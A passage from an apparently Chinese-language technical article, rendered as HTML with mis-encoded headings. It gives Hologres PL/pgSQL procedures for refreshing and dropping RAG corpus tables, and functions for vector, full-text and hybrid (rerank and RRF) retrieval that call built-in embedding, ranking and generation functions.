<pre><code class="hljs language-css" lang="css">obj_table_name := corpus_name || <span class="hljs-string">'_obj_table'</span>;

full_corpus_ident := <span class="hljs-built_in">format</span>(<span class="hljs-string">'%I.%I'</span>, corpus_schema, corpus_name);
full_obj_ident    := <span class="hljs-built_in">format</span>(<span class="hljs-string">'%I.%I'</span>, corpus_schema, obj_table_name);

-- <span class="hljs-number">2</span>. åˆ·æ–° <span class="hljs-selector-tag">Object</span> <span class="hljs-selector-tag">Table</span>
RAISE NOTICE 'Refreshing <span class="hljs-selector-tag">Object</span> <span class="hljs-selector-tag">Table</span>: %<span class="hljs-string">', obj_table_name;
EXECUTE format('</span>REFRESH OBJECT TABLE %s;', full_obj_ident);

-- <span class="hljs-number">3</span>. åˆ·æ–° Dynamic <span class="hljs-selector-tag">Table</span>
RAISE NOTICE 'Refreshing Dynamic <span class="hljs-selector-tag">Table</span>: %<span class="hljs-string">', corpus_name;
EXECUTE format('</span>REFRESH TABLE %s;', full_corpus_ident);

RAISE NOTICE 'Refresh complete for corpus <span class="hljs-selector-tag">table</span> %', corpus_table;
</code></pre>
<p>END;</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow/><annotation encoding="application/x-tex"/></semantics></math></span><span class="katex-html" aria-hidden="true"/></span></span></div>
</li>
<li>
<p>åˆ é™¤Object Tableå’ŒDynamic Tableå­˜å‚¨è¿‡ç¨‹</p>
<p>CREATE OR REPLACE PROCEDURE drop_rag_corpus_table(
corpus_table TEXT
)
AS $$
DECLARE
corpus_schema TEXT;
corpus_name   TEXT;
obj_table_name TEXT;
full_corpus_ident TEXT;
full_obj_ident    TEXT;
rec RECORD;
BEGIN
-- 1. è§£æ schema å’Œè¡¨å
IF position('.' in corpus_table) &gt; 0 THEN
corpus_schema := split_part(corpus_table, '.', 1);
corpus_name   := split_part(corpus_table, '.', 2);
ELSE
corpus_schema := 'public';
corpus_name   := corpus_table;
END IF;</p>
<pre><code class="hljs language-sql" lang="sql">obj_table_name :<span class="hljs-operator">=</span> corpus_name <span class="hljs-operator">||</span> <span class="hljs-string">'_obj_table'</span>;

full_corpus_ident :<span class="hljs-operator">=</span> format(<span class="hljs-string">'%I.%I'</span>, corpus_schema, corpus_name);
full_obj_ident    :<span class="hljs-operator">=</span> format(<span class="hljs-string">'%I.%I'</span>, corpus_schema, obj_table_name);

<span class="hljs-comment">-- 2. åˆ é™¤è¡¨</span>
<span class="hljs-comment">-- 2.1 å…³é—­åŠ¨æ€è¡¨è‡ªåŠ¨åˆ·æ–°</span>
<span class="hljs-comment">-- RAISE NOTICE 'Disabling auto refresh for %', full_corpus_ident;</span>
<span class="hljs-comment">-- EXECUTE format('ALTER TABLE IF EXISTS %s SET (auto_refresh_enable=false)', full_corpus_ident);</span>

<span class="hljs-comment">-- 2.2 æŸ¥æ‰¾ RUNNING åˆ·æ–°ä»»åŠ¡å¹¶å–æ¶ˆ</span>
<span class="hljs-keyword">FOR</span> rec <span class="hljs-keyword">IN</span>
    <span class="hljs-keyword">EXECUTE</span> format(
        $f$
        <span class="hljs-keyword">SELECT</span> query_job_id
            <span class="hljs-keyword">FROM</span> hologres.hg_dynamic_table_refresh_log(<span class="hljs-operator">%</span>L)
            <span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> <span class="hljs-string">'RUNNING'</span>;
        $f$,
        corpus_table
    )
LOOP
    RAISE NOTICE <span class="hljs-string">'Found running refresh job: %'</span>, rec.query_job_id;
    IF hologres.hg_internal_cancel_query_job(rec.query_job_id::<span class="hljs-type">bigint</span>) <span class="hljs-keyword">THEN</span>
        RAISE NOTICE <span class="hljs-string">'Cancel job % succeeded.'</span>, rec.query_job_id;
    <span class="hljs-keyword">ELSE</span>
        RAISE WARNING <span class="hljs-string">'Cancel job % failed.'</span>, rec.query_job_id;
    <span class="hljs-keyword">END</span> IF;
<span class="hljs-keyword">END</span> LOOP;

<span class="hljs-comment">-- 2.3 åˆ é™¤ Dynamic Table</span>
RAISE NOTICE <span class="hljs-string">'Dropping Dynamic Table: %'</span>, corpus_name;
<span class="hljs-keyword">EXECUTE</span> format(<span class="hljs-string">'DROP TABLE IF EXISTS %s;'</span>, full_corpus_ident);

<span class="hljs-comment">-- 2.4 åˆ é™¤ Object Table</span>
RAISE NOTICE <span class="hljs-string">'Dropping Object Table: %'</span>, obj_table_name;
<span class="hljs-keyword">EXECUTE</span> format(<span class="hljs-string">'DROP OBJECT TABLE IF EXISTS %s;'</span>, full_obj_ident);

RAISE NOTICE <span class="hljs-string">'Drop complete for corpus: %'</span>, corpus_table;
</code></pre>
<p>END;</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow/><annotation encoding="application/x-tex"/></semantics></math></span><span class="katex-html" aria-hidden="true"/></span></span></div>
</li>
</ul>
<h3 data-id="heading-11">å‘é‡æ£€ç´¢å‡½æ•°</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- RAGå‘é‡å•è·¯å¬å›é—®ç­”</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">FUNCTION</span> qa_vector_search_retrieval(
    question TEXT,
    corpus_table TEXT,
    embedding_model TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
    llm_model TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
    ranking_model TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
    prompt TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'Please answer the following question in ${language} based on the reference information.\n\n Question: ${question}\n\n Reference information:\n\n ${context}'</span>,
    <span class="hljs-keyword">language</span> TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'Chinese'</span>,
    vector_recall_count <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">20</span>,
    rerank_recall_count <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">5</span>,
    vector_col TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'embedding_vector'</span>
)
<span class="hljs-keyword">RETURNS</span> TEXT <span class="hljs-keyword">AS</span>
$$
<span class="hljs-keyword">DECLARE</span>
    final_answer TEXT;
    <span class="hljs-keyword">sql</span> TEXT;
    embedding_expr TEXT;
    ai_rank_expr TEXT;
    ai_gen_expr TEXT;
    embedding_model_valid <span class="hljs-type">BOOLEAN</span>;
    llm_model_valid <span class="hljs-type">BOOLEAN</span>;
    ranking_model_valid <span class="hljs-type">BOOLEAN</span>;
<span class="hljs-keyword">BEGIN</span>
    embedding_model_valid :<span class="hljs-operator">=</span> (embedding_model <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">trim</span>(embedding_model) <span class="hljs-operator">!=</span> <span class="hljs-string">''</span>);
    llm_model_valid :<span class="hljs-operator">=</span> (llm_model <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">trim</span>(llm_model) <span class="hljs-operator">!=</span> <span class="hljs-string">''</span>);
    ranking_model_valid :<span class="hljs-operator">=</span> (ranking_model <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">trim</span>(ranking_model) <span class="hljs-operator">!=</span> <span class="hljs-string">''</span>);

    IF embedding_model_valid <span class="hljs-keyword">THEN</span>
        embedding_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_embed('</span> <span class="hljs-operator">||</span> quote_literal(embedding_model) <span class="hljs-operator">||</span> <span class="hljs-string">', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">')'</span>;
    <span class="hljs-keyword">ELSE</span>
        embedding_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_embed('</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">')'</span>;
    <span class="hljs-keyword">END</span> IF;

    IF ranking_model_valid <span class="hljs-keyword">THEN</span>
        ai_rank_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_rank('</span> <span class="hljs-operator">||</span> quote_literal(ranking_model) <span class="hljs-operator">||</span> <span class="hljs-string">', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">', chunk)'</span>;
    <span class="hljs-keyword">ELSE</span>
        ai_rank_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_rank('</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">', chunk)'</span>;
    <span class="hljs-keyword">END</span> IF;

    IF llm_model_valid <span class="hljs-keyword">THEN</span>
        ai_gen_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_gen('</span> <span class="hljs-operator">||</span> quote_literal(llm_model) <span class="hljs-operator">||</span>
            <span class="hljs-string">', replace(replace(replace('</span> <span class="hljs-operator">||</span> quote_literal(prompt) <span class="hljs-operator">||</span>
               <span class="hljs-string">', ''${question}'', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">'), ''${context}'', merged_chunks), ''${language}'', '</span> <span class="hljs-operator">||</span> quote_literal(<span class="hljs-keyword">language</span>) <span class="hljs-operator">||</span> <span class="hljs-string">') )'</span>;
    <span class="hljs-keyword">ELSE</span>
        ai_gen_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_gen(replace(replace(replace('</span> <span class="hljs-operator">||</span> quote_literal(prompt) <span class="hljs-operator">||</span>
               <span class="hljs-string">', ''${question}'', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">'), ''${context}'', merged_chunks), ''${language}'', '</span> <span class="hljs-operator">||</span> quote_literal(<span class="hljs-keyword">language</span>) <span class="hljs-operator">||</span> <span class="hljs-string">'))'</span>;
    <span class="hljs-keyword">END</span> IF;

    <span class="hljs-keyword">sql</span> :<span class="hljs-operator">=</span> <span class="hljs-string">'
      WITH
        embedding_recall AS (
            SELECT
              chunk,
              approx_cosine_distance('</span> <span class="hljs-operator">||</span> vector_col <span class="hljs-operator">||</span> <span class="hljs-string">', '</span> <span class="hljs-operator">||</span> embedding_expr <span class="hljs-operator">||</span> <span class="hljs-string">') AS distance
            FROM
              '</span> <span class="hljs-operator">||</span> corpus_table <span class="hljs-operator">||</span> <span class="hljs-string">'
            ORDER BY
              distance DESC
            LIMIT '</span> <span class="hljs-operator">||</span> vector_recall_count <span class="hljs-operator">||</span> <span class="hljs-string">'
        ),
        rerank AS (
            SELECT
              chunk,
              '</span> <span class="hljs-operator">||</span> ai_rank_expr <span class="hljs-operator">||</span> <span class="hljs-string">' AS score
            FROM
              embedding_recall
            ORDER BY
              score DESC
            LIMIT '</span> <span class="hljs-operator">||</span> rerank_recall_count <span class="hljs-operator">||</span> <span class="hljs-string">'
        ),
        concat_top_chunks AS (
            SELECT string_agg(chunk, E''\n\n----\n\n'') AS merged_chunks FROM rerank
        )
      SELECT '</span> <span class="hljs-operator">||</span> ai_gen_expr <span class="hljs-operator">||</span> <span class="hljs-string">'
      FROM concat_top_chunks;
    '</span>;

    <span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">sql</span> <span class="hljs-keyword">INTO</span> final_answer;
    <span class="hljs-keyword">RETURN</span> final_answer;
<span class="hljs-keyword">END</span>;
$$ <span class="hljs-keyword">LANGUAGE</span> plpgsql;
</code></pre>
<h3 data-id="heading-12">å…¨æ–‡æ£€ç´¢å‡½æ•°</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">FUNCTION</span> qa_text_search_retrieval(
    question TEXT,
    corpus_table TEXT,
    llm_model TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
    ranking_model TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
    prompt TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'Please answer the following question in ${language} based on the reference information.\n\n Question: ${question}\n\n Reference information:\n\n ${context}'</span>,
    <span class="hljs-keyword">language</span> TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'Chinese'</span>,
    text_search_recall_count <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">20</span>,
    rerank_recall_count <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">5</span>,
    text_search_col TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'chunk'</span>
)
<span class="hljs-keyword">RETURNS</span> TEXT <span class="hljs-keyword">AS</span>
$$
<span class="hljs-keyword">DECLARE</span>
    final_answer TEXT;
    <span class="hljs-keyword">sql</span> TEXT;
    ai_rank_expr TEXT;
    ai_gen_expr TEXT;
    llm_model_valid <span class="hljs-type">BOOLEAN</span>;
    ranking_model_valid <span class="hljs-type">BOOLEAN</span>;
<span class="hljs-keyword">BEGIN</span>
    llm_model_valid     :<span class="hljs-operator">=</span> (llm_model <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">trim</span>(llm_model) <span class="hljs-operator">!=</span> <span class="hljs-string">''</span>);
    ranking_model_valid :<span class="hljs-operator">=</span> (ranking_model <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">trim</span>(ranking_model) <span class="hljs-operator">!=</span> <span class="hljs-string">''</span>);

    IF ranking_model_valid <span class="hljs-keyword">THEN</span>
        ai_rank_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_rank('</span> <span class="hljs-operator">||</span> quote_literal(ranking_model) <span class="hljs-operator">||</span> <span class="hljs-string">', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">', chunk)'</span>;
    <span class="hljs-keyword">ELSE</span>
        ai_rank_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_rank('</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">', chunk)'</span>;
    <span class="hljs-keyword">END</span> IF;

    IF llm_model_valid <span class="hljs-keyword">THEN</span>
        ai_gen_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_gen('</span> <span class="hljs-operator">||</span> quote_literal(llm_model) <span class="hljs-operator">||</span>
            <span class="hljs-string">', replace(replace(replace('</span> <span class="hljs-operator">||</span> quote_literal(prompt) <span class="hljs-operator">||</span>
               <span class="hljs-string">', ''${question}'', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span>
               <span class="hljs-string">'), ''${context}'', merged_chunks), ''${language}'', '</span> <span class="hljs-operator">||</span> quote_literal(<span class="hljs-keyword">language</span>) <span class="hljs-operator">||</span> <span class="hljs-string">') )'</span>;
    <span class="hljs-keyword">ELSE</span>
        ai_gen_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_gen(replace(replace(replace('</span> <span class="hljs-operator">||</span> quote_literal(prompt) <span class="hljs-operator">||</span>
               <span class="hljs-string">', ''${question}'', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span>
               <span class="hljs-string">'), ''${context}'', merged_chunks), ''${language}'', '</span> <span class="hljs-operator">||</span> quote_literal(<span class="hljs-keyword">language</span>) <span class="hljs-operator">||</span> <span class="hljs-string">'))'</span>;
    <span class="hljs-keyword">END</span> IF;

    <span class="hljs-keyword">sql</span> :<span class="hljs-operator">=</span> <span class="hljs-string">'
      WITH
        text_search_recall AS (
            SELECT
              chunk
            FROM
              '</span> <span class="hljs-operator">||</span> corpus_table <span class="hljs-operator">||</span> <span class="hljs-string">'
            ORDER BY
              text_search('</span> <span class="hljs-operator">||</span> text_search_col <span class="hljs-operator">||</span> <span class="hljs-string">', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">') DESC
            LIMIT '</span> <span class="hljs-operator">||</span> text_search_recall_count <span class="hljs-operator">||</span> <span class="hljs-string">'
        ),
        rerank AS (
            SELECT
              chunk,
              '</span> <span class="hljs-operator">||</span> ai_rank_expr <span class="hljs-operator">||</span> <span class="hljs-string">' AS score
            FROM
              text_search_recall
            ORDER BY
              score DESC
            LIMIT '</span> <span class="hljs-operator">||</span> rerank_recall_count <span class="hljs-operator">||</span> <span class="hljs-string">'
        ),
        concat_top_chunks AS (
            SELECT string_agg(chunk, E''\n\n----\n\n'') AS merged_chunks FROM rerank
        )
      SELECT '</span> <span class="hljs-operator">||</span> ai_gen_expr <span class="hljs-operator">||</span> <span class="hljs-string">'
      FROM concat_top_chunks;
    '</span>;

    <span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">sql</span> <span class="hljs-keyword">INTO</span> final_answer;
    <span class="hljs-keyword">RETURN</span> final_answer;
<span class="hljs-keyword">END</span>;
$$ <span class="hljs-keyword">LANGUAGE</span> plpgsql;
</code></pre>
<h3 data-id="heading-13">å‘é‡+å…¨æ–‡åŒè·¯å¬å›+Rankæ’åºå‡½æ•°</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">FUNCTION</span> qa_hybrid_retrieval(
    question TEXT,
    corpus_table TEXT,
    embedding_model TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
    llm_model TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
    ranking_model TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
    prompt TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'Please answer the following question in ${language} based on the reference information.\n\n Question: ${question}\n\n Reference information:\n\n ${context}'</span>,
    <span class="hljs-keyword">language</span> TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'Chinese'</span>,
    text_search_recall_count <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">20</span>,
    vector_recall_count <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">20</span>,
    rerank_recall_count <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">5</span>,
    vector_col TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'embedding_vector'</span>,
    text_search_col TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'chunk'</span>
)
<span class="hljs-keyword">RETURNS</span> TEXT <span class="hljs-keyword">AS</span>
$$
<span class="hljs-keyword">DECLARE</span>
    final_answer TEXT;
    <span class="hljs-keyword">sql</span> TEXT;
    embedding_expr TEXT;
    ai_rank_expr TEXT;
    ai_gen_expr TEXT;
    embedding_model_valid <span class="hljs-type">BOOLEAN</span>;
    llm_model_valid <span class="hljs-type">BOOLEAN</span>;
    ranking_model_valid <span class="hljs-type">BOOLEAN</span>;
<span class="hljs-keyword">BEGIN</span>
    embedding_model_valid :<span class="hljs-operator">=</span> (embedding_model <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">trim</span>(embedding_model) <span class="hljs-operator">!=</span> <span class="hljs-string">''</span>);
    llm_model_valid       :<span class="hljs-operator">=</span> (llm_model <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">trim</span>(llm_model) <span class="hljs-operator">!=</span> <span class="hljs-string">''</span>);
    ranking_model_valid   :<span class="hljs-operator">=</span> (ranking_model <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">trim</span>(ranking_model) <span class="hljs-operator">!=</span> <span class="hljs-string">''</span>);

    IF embedding_model_valid <span class="hljs-keyword">THEN</span>
        embedding_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_embed('</span> <span class="hljs-operator">||</span> quote_literal(embedding_model) <span class="hljs-operator">||</span> <span class="hljs-string">', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">')'</span>;
    <span class="hljs-keyword">ELSE</span>
        embedding_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_embed('</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">')'</span>;
    <span class="hljs-keyword">END</span> IF;

    IF ranking_model_valid <span class="hljs-keyword">THEN</span>
        ai_rank_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_rank('</span> <span class="hljs-operator">||</span> quote_literal(ranking_model) <span class="hljs-operator">||</span> <span class="hljs-string">', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">', chunk)'</span>;
    <span class="hljs-keyword">ELSE</span>
        ai_rank_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_rank('</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">', chunk)'</span>;
    <span class="hljs-keyword">END</span> IF;

    IF llm_model_valid <span class="hljs-keyword">THEN</span>
        ai_gen_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_gen('</span> <span class="hljs-operator">||</span> quote_literal(llm_model) <span class="hljs-operator">||</span>
            <span class="hljs-string">', replace(replace(replace('</span> <span class="hljs-operator">||</span> quote_literal(prompt) <span class="hljs-operator">||</span>
               <span class="hljs-string">', ''${question}'', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">'), ''${context}'', merged_chunks), ''${language}'', '</span> <span class="hljs-operator">||</span> quote_literal(<span class="hljs-keyword">language</span>) <span class="hljs-operator">||</span> <span class="hljs-string">') )'</span>;
    <span class="hljs-keyword">ELSE</span>
        ai_gen_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_gen(replace(replace(replace('</span> <span class="hljs-operator">||</span> quote_literal(prompt) <span class="hljs-operator">||</span>
               <span class="hljs-string">', ''${question}'', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">'), ''${context}'', merged_chunks), ''${language}'', '</span> <span class="hljs-operator">||</span> quote_literal(<span class="hljs-keyword">language</span>) <span class="hljs-operator">||</span> <span class="hljs-string">'))'</span>;
    <span class="hljs-keyword">END</span> IF;

    <span class="hljs-keyword">sql</span> :<span class="hljs-operator">=</span> <span class="hljs-string">'
      WITH
        embedding_recall AS (
            SELECT
              chunk
            FROM
              '</span> <span class="hljs-operator">||</span> corpus_table <span class="hljs-operator">||</span> <span class="hljs-string">'
            ORDER BY
              approx_cosine_distance('</span> <span class="hljs-operator">||</span> vector_col <span class="hljs-operator">||</span> <span class="hljs-string">', '</span> <span class="hljs-operator">||</span> embedding_expr <span class="hljs-operator">||</span> <span class="hljs-string">') DESC
            LIMIT '</span> <span class="hljs-operator">||</span> vector_recall_count <span class="hljs-operator">||</span> <span class="hljs-string">'
        ),
        text_search_recall AS (
            SELECT
              chunk
            FROM
              '</span> <span class="hljs-operator">||</span> corpus_table <span class="hljs-operator">||</span> <span class="hljs-string">'
            ORDER BY
              text_search('</span> <span class="hljs-operator">||</span> text_search_col <span class="hljs-operator">||</span> <span class="hljs-string">', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">') DESC
            LIMIT '</span> <span class="hljs-operator">||</span> text_search_recall_count <span class="hljs-operator">||</span> <span class="hljs-string">'
        ),
        union_recall AS (
            SELECT chunk FROM embedding_recall
            UNION
            SELECT chunk FROM text_search_recall
        ),
        rerank AS (
            SELECT
              chunk,
              '</span> <span class="hljs-operator">||</span> ai_rank_expr <span class="hljs-operator">||</span> <span class="hljs-string">' AS score
            FROM
              union_recall
            ORDER BY
              score DESC
            LIMIT '</span> <span class="hljs-operator">||</span> rerank_recall_count <span class="hljs-operator">||</span> <span class="hljs-string">'
        ),
        concat_top_chunks AS (
            SELECT string_agg(chunk, E''\n\n----\n\n'') AS merged_chunks FROM rerank
        )
      SELECT '</span> <span class="hljs-operator">||</span> ai_gen_expr <span class="hljs-operator">||</span> <span class="hljs-string">'
      FROM concat_top_chunks;
    '</span>;

    <span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">sql</span> <span class="hljs-keyword">INTO</span> final_answer;
    <span class="hljs-keyword">RETURN</span> final_answer;
<span class="hljs-keyword">END</span>;
$$ <span class="hljs-keyword">LANGUAGE</span> plpgsql;
</code></pre>
<h3 data-id="heading-14">å‘é‡+å…¨æ–‡åŒè·¯å¬å›+RRFæ’åºå‡½æ•°</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">FUNCTION</span> qa_hybrid_retrieval_rrf(
    question TEXT,
    corpus_table TEXT,
    embedding_model TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
    llm_model TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
    ranking_model TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
    prompt TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'Please answer the following question in ${language} based on the reference information.\n\n Question: ${question}\n\n Reference information:\n\n ${context}'</span>,
    <span class="hljs-keyword">language</span> TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'Chinese'</span>,
    text_search_recall_count <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">20</span>,
    vector_recall_count <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">20</span>,
    rerank_recall_count <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">5</span>,
    rrf_k <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">60</span>,
    vector_col TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'embedding_vector'</span>,
    text_search_col TEXT <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'chunk'</span>
)
<span class="hljs-keyword">RETURNS</span> TEXT <span class="hljs-keyword">AS</span>
$$
<span class="hljs-keyword">DECLARE</span>
    final_answer TEXT;
    <span class="hljs-keyword">sql</span> TEXT;
    embedding_expr TEXT;
    ai_rank_expr TEXT;
    ai_gen_expr TEXT;
    embedding_model_valid <span class="hljs-type">BOOLEAN</span>;
    llm_model_valid <span class="hljs-type">BOOLEAN</span>;
    ranking_model_valid <span class="hljs-type">BOOLEAN</span>;
<span class="hljs-keyword">BEGIN</span>
    embedding_model_valid :<span class="hljs-operator">=</span> (embedding_model <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">trim</span>(embedding_model) <span class="hljs-operator">&lt;&gt;</span> <span class="hljs-string">''</span>);
    llm_model_valid       :<span class="hljs-operator">=</span> (llm_model <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">trim</span>(llm_model) <span class="hljs-operator">&lt;&gt;</span> <span class="hljs-string">''</span>);
    ranking_model_valid   :<span class="hljs-operator">=</span> (ranking_model <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">trim</span>(ranking_model) <span class="hljs-operator">&lt;&gt;</span> <span class="hljs-string">''</span>);

    IF embedding_model_valid <span class="hljs-keyword">THEN</span>
        embedding_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_embed('</span> <span class="hljs-operator">||</span> quote_literal(embedding_model) <span class="hljs-operator">||</span> <span class="hljs-string">', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">')'</span>;
    <span class="hljs-keyword">ELSE</span>
        embedding_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_embed('</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">')'</span>;
    <span class="hljs-keyword">END</span> IF;

    IF ranking_model_valid <span class="hljs-keyword">THEN</span>
        ai_rank_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_rank('</span> <span class="hljs-operator">||</span> quote_literal(ranking_model) <span class="hljs-operator">||</span> <span class="hljs-string">', '</span> <span class="hljs-operator">||</span> quote_literal(question) <span class="hljs-operator">||</span> <span class="hljs-string">', chunk)'</span>;
    <span class="hljs-keyword">ELSE</span>
